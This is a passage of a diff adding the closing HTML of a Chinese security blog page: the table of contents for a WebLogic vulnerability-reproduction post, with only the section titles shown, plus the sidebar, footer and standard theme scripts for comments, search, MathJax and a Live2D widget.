+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  <!-- disqus embedded js code start end -->
+
+  <!-- disqus comment end -->
+
+
+        <!-- comments end -->
+        <hr>
+
+      </div>
+
+      <!-- Catalog: Tabe of Content -->
+      <!-- Table of Contents -->
+
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">目录</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">漏洞复现 - weblogic(一)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#CVE-2017-10271"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">- CVE-2017-10271 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">- 实验环境 -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-nav-number">1.1.2.</span> <span class="toc-nav-text">- 漏洞分析 -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-nav-number">1.1.3.</span> <span class="toc-nav-text">- 复现过程 -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#exp"><span class="toc-nav-number">1.1.4.</span> <span class="toc-nav-text">- exp -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#CVE-2018-2628"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">- CVE-2018-2628 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83-2"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">- 实验环境 -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">- 漏洞分析 -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B-2"><span class="toc-nav-number">1.2.3.</span> <span class="toc-nav-text">- 复现过程 -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#exp-2"><span class="toc-nav-number">1.2.4.</span> <span class="toc-nav-text">- exp -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#CVE-2020-14883-CVE-2020-14882"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">- CVE-2020-14883&#x2F;CVE-2020-14882 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">- 漏洞分析 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2020-14883"><span class="toc-nav-number">1.3.1.1.</span> <span class="toc-nav-text">- CVE-2020-14883 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2020-14882"><span class="toc-nav-number">1.3.1.2.</span> <span class="toc-nav-text">- CVE-2020-14882 -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B-3"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">- 复现过程 -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#exp-3"><span class="toc-nav-number">1.3.3.</span> <span class="toc-nav-text">- exp -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2020-14883-2"><span class="toc-nav-number">1.3.3.1.</span> <span class="toc-nav-text">- CVE-2020-14883 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2020-14882-2"><span class="toc-nav-number">1.3.3.2.</span> <span class="toc-nav-text">- CVE-2020-14882 -</span></a></li></ol></li></ol></li></ol></li></ol>
+        
+        </div>
+      </aside>
+    
+
+
+
+      <!-- Sidebar Container -->
+      <div class="
+                col-lg-8 col-lg-offset-1
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+        <!-- Featured Tags -->
+        
+        <section>
+          <!-- no hr -->
+          <h5>
+            <a href="/tags/">标签</a>
+          </h5>
+          <div class="tags">
+            
+            <a class="tag" href="/tags/#安全" title="安全">安全</a>
+            
+            <a class="tag" href="/tags/#漏洞" title="漏洞">漏洞</a>
+            
+            <a class="tag" href="/tags/#java" title="java">java</a>
+            
+          </div>
+        </section>
+        
+
+        <!-- Friends Blog -->
+        
+        <hr>
+        <h5>朋友们</h5>
+        <ul class="list-inline">
+
+          
+          <li>
+            <a href="https://www.cnblogs.com/Yhck/" target="_blank">Yhck</a>
+          </li>
+          
+          <li>
+            <a href="https://www.cnblogs.com/wkzb/" target="_blank">beiwo</a>
+          </li>
+          
+          <li>
+            <a href="https://leohearts.com/" target="_blank">Leohearts</a>
+          </li>
+          
+          <li>
+            <a href="https://longlone.top/" target="_blank">Longlone</a>
+          </li>
+          
+          <li>
+            <a href="http://na0hblog.top/" target="_blank">Na0h</a>
+          </li>
+          
+        </ul>
+        
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+<!-- anchorjs start -->
+<!-- async load function -->
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script type="text/javascript">
+  // async load function
+  function async (u, c) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) {
+      o.addEventListener('load', function(e) {
+        c(null, e);
+      }, false);
+    }
+    s.parentNode.insertBefore(o, s);
+  };
+</script>
+<script type="text/javascript">
+  //anchor-js, Doc:http://bryanbraun.github.io/anchorjs/
+  async ("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js", function() {
+    anchors.options = {
+      visible: 'hover',
+      placement: 'left',
+      // icon: 'ℬ'
+      icon: '❡'
+    };
+    anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+  });
+</script>
+<style>
+  /* place left on bigger screen */
+  @media all and (min-width: 800px) {
+    .anchorjs-link {
+      position: absolute;
+      left: -0.75em;
+      font-size: 1.1em;
+      margin-top: -0.1em;
+    }
+  }
+</style>
+
+<!-- anchorjs end -->
+
+
+
+		<!-- Footer (contains ThemeColor、viewer) -->
+		<!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center">
+          
+
+          
+            <li>
+              <a target="_blank" href="https://github.com/Morouu">
+                <span class="fa-stack fa-lg">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+
+        </ul>
+        <p class="copyright text-muted">
+         &copy; 2022
+		 <i class="icon-smile"></i>
+          morouu
+          <br>
+          Theme by
+          <a target="_blank" rel="noopener" href="http://beantech.org">BeanTech</a>
+          <span style="display: inline-block; margin: 0 5px;">
+            <i class="fa fa-heart"></i>
+          </span>
+          re-Ported by
+          <a target="_blank" rel="noopener" href="https://v-vincen.life/">Live My Life</a>
+          |
+          <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0" width="91px" height="20px" src="https://ghbtns.com/github-btn.html?user=V-Vincen&repo=V-Vincen.github.io&type=star&count=true"></iframe>
+        <div class=" copyright text-muted live_time"><span>本博客已萌萌哒地运行</span><span id="display_live_time"> 0 天 0 小时 0 分 0 秒</span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+  setTimeout(blog_live_time, 1000);
+  const start = new Date('2021-12-27T20:23:15');
+  const now = new Date();
+  const timeDiff = (now.getTime() - start.getTime());
+  const msPerMinute = 60 * 1000;
+  const msPerHour = 60 * msPerMinute;
+  const msPerDay = 24 * msPerHour;
+  const passDay = Math.floor(timeDiff / msPerDay);
+  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
+  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
+  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
+  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
+}
+blog_live_time();
+</script></div>
+		</p>
+		
+      </div>
+    </div>
+  </div>
+</footer>
+
+<a id="rocket" href="#top" class=""></a>
+
+
+  <!-- jQuery -->
+  <script type="text/javascript" src="/js/jquery.min.js"></script>
+  <!-- Bootstrap Core JavaScript -->
+  <script type="text/javascript" src="/js/bootstrap.min.js"></script>
+  <!-- Custom Theme JavaScript -->
+  <script type="text/javascript" src="/js/hux-blog.min.js"></script>
+  <!-- catalog -->
+  <script async="true" type="text/javascript" src="/js/catalog.js"></script>
+  <!-- totop(rocket) -->
+  <script async="true" type="text/javascript" src="/js/totop.js"></script>
+
+  
+    <!-- Busuanzi JavaScript -->
+    <script async="async" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <!-- Scroll start -->
+    <script async="async" type="text/javascript" src="/js/scroll.js"></script>
+    <!-- Scroll end -->
+  
+
+  
+    <!-- LangSelect start -->
+    <script type="text/javascript" src="/js/langselect.js"></script>
+    <!-- LangSelect end -->
+  
+
+  
+    <!-- Mouseclick -->
+    <script type="text/javascript" src="/js/mouseclick.js" content='' color=''></script>
+  
+
+  
+    <!-- ribbon -->
+    <script type="text/javascript" src="/js/ribbonDynamic.js"></script>
+  
+
+  
+    <!-- Line start -->
+    <script async="text/javascript" src="/js/line.js"></script>
+    <!-- Line end -->
+  
+
+
+
+
+
+
+  <!-- viewer start -->
+  <!-- viewer start (Picture preview) -->
+  
+    <script async="async" type="text/javascript" src="/js/viewer/viewer.min.js"></script>
+    <script async="async" type="text/javascript" src="/js/viewer/pic-viewer.js"></script>
+  
+
+  <!-- viewer end -->
+
+
+<script>
+  // async load function
+  function async (u, c) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) {
+      o.addEventListener('load', function (e) {
+        c(null, e);
+      }, false);
+    }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  // fastClick.js
+  async ("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function () {
+    var $nav = document.querySelector("nav");
+    if ($nav)
+      FastClick.attach($nav);
+    }
+  )
+</script>
+
+<!-- Because of the native support for backtick-style fenced code blocks right within the Markdown is landed in Github Pages, From V1.6, There is no need for Highlight.js, so Huxblog drops it officially. -
+https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0 - https://help.github.com/articles/creating-and-highlighting-code-blocks/ -->
+<!-- <script> async ("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function () { hljs.initHighlightingOnLoad(); }) </script> <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet"> -->
+
+<!-- jquery.tagcloud.js -->
+<!-- <script> // only load tagcloud.js in tag.html if ($('#tag_cloud').length !== 0) { async ("https://morblog.cc/js/jquery.tagcloud.js", function () { $.fn.tagcloud.defaults = { // size: { start: 1, end: 1, unit: 'em' }, color: {
+start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </script> -->
+
+
+		<!-- Search -->
+		
+		<div class="popup search-popup local-search-popup">
+  <span class="popup-btn-close">
+    ESC
+  </span>
+  <div class="container">
+    <div class="row">
+      <!-- <div class="col-md-9 col-md-offset-1"> -->
+      <div class="col-lg-9 col-lg-offset-1 col-md-10 col-md-offset-1 local-search-content">
+
+        <div class="local-search-header clearfix">
+
+          <div class="local-search-input-wrapper">
+            <span class="search-icon">
+              <i class="fa fa-search fa-lg" style="margin: 25px 10px 25px 20px;"></i>
+            </span>
+            <input autocomplete="off" placeholder="搜索..." type="text" id="local-search-input">
+          </div>
+        </div>
+        <div id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+  
+    <script src="/js/ziploader.js"></script>
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.json";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    // monitor main search box;
+    var onPopupClose = function (e) {
+      $('.popup').fadeOut(300);
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $('.popup').fadeIn(300);
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+    // get search zip version
+    $.get('/searchVersion.json?t=' + (+new Date()), function (res) {
+      if (localStorage.getItem('searchVersion') !== res) {
+        localStorage.setItem('searchVersion', res);
+        initSearchJson();
+      }
+    });
+
+    function initSearchJson() {
+      initLoad(['/search.flv'], {
+        loadOptions: {
+          success: function (obj) {
+            localStorage.setItem('searchJson', obj['search.json'])
+          },
+          error: function (e) {
+            return console.log(e)
+          }
+        },
+        returnOptions: {
+          'json': TYPE_TEXT
+        },
+        mimeOptions: {
+          'json': 'application/json'
+        }
+      })
+    }
+    // search function;
+    var searchFunc = function (search_id, content_id) {
+      'use strict';
+      isfetched = true;
+      var datas = JSON.parse(localStorage.getItem('searchJson'));
+      // console.log(search_id)
+      var input = document.getElementById(search_id);
+      var resultContent = document.getElementById(content_id);
+      var inputEventFunction = function () {
+        var searchText = input.value.trim().toLowerCase();
+        var keywords = searchText.split(/[\s\-]+/);
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        var resultItems = [];
+        if (searchText.length > 0) {
+          // perform local searching
+          datas.forEach(function (data) {
+            var isMatch = false;
+            var hitCount = 0;
+            var searchTextCount = 0;
+            var title = data.title
+              ? data.title.trim()
+              : '';
+            var titleInLowerCase = title.toLowerCase();
+            var content = data.content
+              ? data.content.trim().replace(/<[^>]+>/g, "")
+              : '';
+            var contentInLowerCase = content.toLowerCase();
+            var articleUrl = decodeURIComponent(data.url);
+
+            var date = data.date;
+            var dateTime = date.replace(/T/, " ").replace(/.000Z/, "");
+            var imgUrl = data.header_img;
+            
+
+
+            var indexOfTitle = [];
+            var indexOfContent = [];
+            // only match articles with not empty titles
+            keywords.forEach(function (keyword) {
+              function getIndexByWord(word, text, caseSensitive) {
+                var wordLen = word.length;
+                if (wordLen === 0) {
+                  return [];
+                }
+                var startPosition = 0,
+                  position = [],
+                  index = [];
+                if (!caseSensitive) {
+                  text = text.toLowerCase();
+                  word = word.toLowerCase();
+                }
+                while ((position = text.indexOf(word, startPosition)) > -1) {
+                  index.push({position: position, word: word});
+                  startPosition = position + wordLen;
+                }
+                return index;
+              }
+              indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+              indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+            });
+            if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+              isMatch = true;
+              hitCount = indexOfTitle.length + indexOfContent.length;
+            }
+            // show search results
+            if (isMatch) {
+              // sort index by position of keyword
+              [indexOfTitle, indexOfContent].forEach(function (index) {
+                index.sort(function (itemLeft, itemRight) {
+                  if (itemRight.position !== itemLeft.position) {
+                    return itemRight.position - itemLeft.position;
+                  } else {
+                    return itemLeft.word.length - itemRight.word.length;
+                  }
+                });
+              });
+              // merge hits into slices
+              function mergeIntoSlice(text, start, end, index) {
+                var item = index[index.length - 1];
+                var position = item.position;
+                var word = item.word;
+                var hits = [];
+                var searchTextCountInSlice = 0;
+                while (position + word.length <= end && index.length != 0) {
+                  if (word === searchText) {
+                    searchTextCountInSlice++;
+                  }
+                  hits.push({position: position, length: word.length});
+                  var wordEnd = position + word.length;
+                  // move to next position of hit
+                  index.pop();
+                  while (index.length != 0) {
+                    item = index[index.length - 1];
+                    position = item.position;
+                    word = item.word;
+                    if (wordEnd > position) {
+                      index.pop();
+                    } else {
+                      break;
+                    }
+                  }
+                }
+                searchTextCount += searchTextCountInSlice;
+                return {hits: hits, start: start, end: end, searchTextCount: searchTextCountInSlice};
+              }
+              var slicesOfTitle = [];
+              if (indexOfTitle.length != 0) {
+                slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+              }
+              var slicesOfContent = [];
+              while (indexOfContent.length != 0) {
+                var item = indexOfContent[indexOfContent.length - 1];
+                var position = item.position;
+                var word = item.word;
+                // cut out 100 characters
+                var start = position - 20;
+                var end = position + 80;
+                if (start < 0) {
+                  start = 0;
+                }
+                if (end < position + word.length) {
+                  end = position + word.length;
+                }
+                if (end > content.length) {
+                  end = content.length;
+                }
+                slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+              }
+              // sort slices in content by search text's count and hits' count
+              slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                  return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                  return sliceRight.hits.length - sliceLeft.hits.length;
+                } else {
+                  return sliceLeft.start - sliceRight.start;
+                }
+              });
+              // select top N slices in content
+              var upperBound = parseInt('1');
+              if (upperBound >= 0) {
+                slicesOfContent = slicesOfContent.slice(0, upperBound);
+              }
+              // highlight title and content
+              function highlightKeyword(text, slice) {
+                var result = '';
+                var prevEnd = slice.start;
+                slice.hits.forEach(function (hit) {
+                  result += text.substring(prevEnd, hit.position);
+                  var end = hit.position + hit.length;
+                  result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                  prevEnd = end;
+                });
+                result += text.substring(prevEnd, slice.end);
+                return result;
+              }
+              var resultItem = '';
+
+              // if (slicesOfTitle.length != 0) {   resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>"; } else {   resultItem += "<li><a target='_blank' href='" +
+              // articleUrl + "' class='search-result-title'>" + title + "</a>"; } slicesOfContent.forEach(function (slice) {   resultItem += "<a target='_blank' href='" + articleUrl + "'><p class=\"search-result\">" + highlightKeyword(content, slice) +
+              // "...</p></a>"; }); resultItem += "</li>";
+
+              if (slicesOfTitle.length != 0) {
+                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</div><time class='search-result-date'>" + dateTime + "</time>";
+              } else {
+                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + title + "</div><time class='search-result-date'>" + dateTime + "</time>";
+              }
+              slicesOfContent.forEach(function (slice) {
+                resultItem += "<p class=\"search-result-content\">" + highlightKeyword(content, slice) + "...</p>";
+              });
+              resultItem += "</div><div class='search-result-right'><img class='media-image' src='" + imgUrl + "' width='64px' height='48px'></img></div></a>";
+
+              resultItems.push({item: resultItem, searchTextCount: searchTextCount, hitCount: hitCount, id: resultItems.length});
+            }
+          })
+        };
+
+        if (keywords.length === 1 && keywords[0] === "") {
+          resultContent.innerHTML = '<div id="no-result"></div>'
+        } else if (resultItems.length === 0) {
+          resultContent.innerHTML = '<div id="no-result"></div>'
+        } else {
+          resultItems.sort(function (resultLeft, resultRight) {
+            if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+              return resultRight.searchTextCount - resultLeft.searchTextCount;
+            } else if (resultLeft.hitCount !== resultRight.hitCount) {
+              return resultRight.hitCount - resultLeft.hitCount;
+            } else {
+              return resultRight.id - resultLeft.id;
+            }
+          });
+          var searchResultList = '<div class=\"search-result-list\">';
+          resultItems.forEach(function (result) {
+            searchResultList += result.item;
+          })
+          searchResultList += "</div>";
+          resultContent.innerHTML = searchResultList;
+        }
+      }
+      if ('auto' === 'auto') {
+        input.addEventListener('input', inputEventFunction);
+      } else {
+        $('.search-icon').click(inputEventFunction);
+        input.addEventListener('keypress', function (event) {
+          if (event.keyCode === 13) {
+            inputEventFunction();
+          }
+        });
+      }
+      // remove loading animation
+      $('body').css('overflow', '');
+      proceedsearch();
+    }
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function (e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc('local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function (e) {
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 && $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+
+    document.addEventListener('mouseup', (e) => {
+      var _con = document.querySelector(".local-search-content");
+      if (_con) {
+        if (!_con.contains(e.target)) {
+          onPopupClose();
+        }
+      }
+    });
+  </script>
+
+
+		
+	<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haru02.model.json"},"display":{"position":"right","width":225,"height":225,"right":125},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
